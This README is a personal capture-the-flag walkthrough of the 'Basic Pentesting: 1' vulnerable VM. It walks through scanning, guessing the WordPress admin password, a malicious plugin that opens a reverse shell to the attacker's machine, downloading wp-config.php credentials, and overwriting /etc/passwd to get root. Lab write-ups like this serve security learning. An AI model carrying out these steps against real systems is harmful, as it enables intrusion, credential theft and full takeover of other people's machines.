# CTF-Walkthrough
This repository contains a list of CTFs/vulnerable virtual machines which I have attempted to pick up CTF skills.

# Basic Pentesting: 1
By Josiah Pierce  

* After the VM has been booted up, we are greeted with a login page that request for the password of user marlinspike.
* The IP address of the VM can be found by clicking the icon with 2 arrows pointing up and down respectively on the top right-hand corner of the VM. No nmap scans are thus needed.
* The IPv4 address of the VM is 192.168.110.135.
* From our Kali VM, execute `nmap -sS 192.168.110.135`.
* There are 3 ports that are open: 21 (ftp), 22 (ssh) and 80 (http). These results are loaded instantly after the command is executed - scan result was previously cached(?).
* We visit 192.168.110.135 and find a web server running. The page says that "It works!".
* Note: Viewing the page source reveals no additional information.
* Note: /admin, /login.php, /robots.txt are invalid pages as well.
* Though the page also said that "no content has been added yet", we cannot necessarily trust it. Thus, run `dirbuster`, which tries to find hidden files and directories using a user-supplied wordlist.
* Put 192.168.110.135 into the `Target URL` of dirbuster. We will use a wordlist that is provided by dirbuster, which can be found in /usr/share/dirbuster/wordlists. We will use `directory-list-lowercase-2.3-small.txt` for a start. We will also use `30 threads`.
* While waiting for dirbuster to do its job, we will look at other areas, such as verifying that it is indeed the ssh service which is running at port 22. Since there is a response that requests for the password, we can confirm that it is indeed the case.
* Heading back to dirbuster, we find that there is a directory called `secret` that contains `wp-content`, `wp-includes`, etc.
* With 192.168.110.135/secret, we expect a WordPress page to load, which happens (page is titled "My secret blog"). Note: the page loads rather slowly - why(?), and the page contents are not loaded properly, i.e. positioning of the texts, icons are off, as if there is no CSS.
* Placing our mouse over some of the links, we find that the hyperlink domain is actually `vtcsec`.
* Next, open our Hosts file in Kali: `sudo nano /etc/hosts`, add in 2 entries: `192.168.110.135 vtcsec` and `192.168.110.135 vtcsec.com`, and finally save the file. What this means is that the IP address of vtcsec is determined by us to be 192.168.110.135, and any machine accesses vtcsec will actually access 192.168.110.135 instead.
* Note: The vtcsec.com mapping is just in case there might be a case where there is a `.com` domain extension for one of the hyperlinks, though we have yet to see one so far.
* Go back to 192.168.110.135/secret and refresh the page - volia, we see that the page has been properly loaded. This is because that the CSS was trying to pull from a domain that did not exist until we added the entries to the Hosts file.
* There is no interesting content on the site's post, so we head to the Login page of the WordPress site and attempt to login using the username `admin` and a random password. Using a random password allows us to check if an account with the username admin exists. The error message from an invalid login, that "the password you entered for the username admin is incorrect" confirms so. This is a form of information leakage in my opinion on WordPress' part.
* We attempt using the password `admin` for the admin account with a quick guess, and access is granted. No kind of bruteforcing is required at this step.
* Head to the Plugins page and install `malicious-wordpress-plugin` by `wetw0rk` (GitHub). Once installed on WordPress, a reverse shell is granted.
* Before beginning the installation of the plugin, we will first start up our listener by opening the Git repository from our terminal, and execute `python wordpwn.py 192.168.110.132 4000`. The IP address in the parameter is that of the Kali machine.
* The payload is then generated in a .zip file. Once the reverse TCP handler (listener) is started on the Kali terminal, we can upload the payload as a plugin (GotEm) to the WordPress site, and activate it.
* We will next head to the plugins editor, select the GotEm plugin to find out the path to the files which are within the plugin, which are `malicious/QwertyRocks.php` and `malicious/wetw0rk_maybe.php`. There are only commented codes in the former, and in the latter, we find that there is a whole long string within a base64_decode and eval functions.
* Next, we head to `vtcsec/secret/wp-contet/plugins/malicious/wetw0rk_maybe.php`.
* Heading back to our Kali terminal, we see that a session has been opened, and enter `shell`. Executing `whoami`, we see that we are www-data. We have now successfully logged into the victim VM.
* From the reverse shell which we have gotten, we can go up a few levels of directory to the one that contains a number of `wp-` PHP files, and specifically we want to download the wp-config.php to the root folder (i.e. back to our Kali machine): `download wp-config.php /root`.
* Open up the config file from our Kali machine with a text editor, and we find that we have the MySQL database username `root` and password `arootmysqlpass`.
* Side-note: We can probably do a **privilege escalation** from here after logging in to the database, but this is not the focus here at this moment.
* Next, we will use `unix-privesc-check` from `pentestmonkey` (GitHub) on the victim VM. This tool is a "shell script to check for simple privilege escalation vectors on Unix systems".
* From our reverse shell, cd to `/var/www/html`, which hosts the secret page. We will now upload the tool to the victim VM: `upload /root/unix-privesc-check`.
* Give executable permissions to the script via chmod, and then `./unix-privesc-check standard > output.txt`. Wait for awhile for our results to be redirected to the output text file. Next, download output.txt to /root.
* Search for the string "WARNING" output.txt and we see that one of the findings is that `/etc/passwd` can be written by anyone. Download the /etc/passwd file to /root.
* We see that the password of root is `x`, which means that it has been encrypted. However, we can overwrite .
* Run openssl passwd -1, and enter a simple password such as `pass`. A password hash is generated as the output. Copy and paste this hash over the `x`, save the file, and upload the file back to the victim VM.
* *Question: What does -1 mean? To give a SHA-1 digest?*
* Execute `su root -l`, but we find that there is an error stating that su must be run from a terminal. Execute `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn a proper shell.
* Note: -l flag means --login, i.e. to start the shell as a login shell with an environment similar to a real login.
* Enter the password as our defined password `pass`, and we have got root access!
